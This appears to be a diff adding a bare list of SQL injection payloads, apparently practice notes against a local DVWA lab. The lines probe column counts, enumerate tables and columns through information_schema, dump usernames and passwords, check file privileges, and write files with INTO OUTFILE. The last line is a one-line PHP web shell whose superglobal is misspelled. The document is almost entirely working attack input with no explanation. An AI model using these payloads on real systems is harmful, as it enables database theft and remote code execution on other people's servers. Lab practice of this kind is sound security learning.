@@ -1,0 +1,16 @@
+id=8' order by 1 --+
+
+id=-8' union select 1,2,3 --+
+
+id=-8' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() -- +
+
+id=-8' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='user' -- +
+
+id=-8' union select 1,group_concat(user,0x3a,pass),3 from user -- +
+
+fileCheck
+id=1' union select 1,group_concat(file_priv,0x3a,user()) from mysql.user--
+
+192.168.0.182/DVWA-master/vulnerabilities/sqli/?id=1' union select 1,2 into outfile '/var/www/html/a.txt'--+
+
+<?php system($GET['cmd']);?>
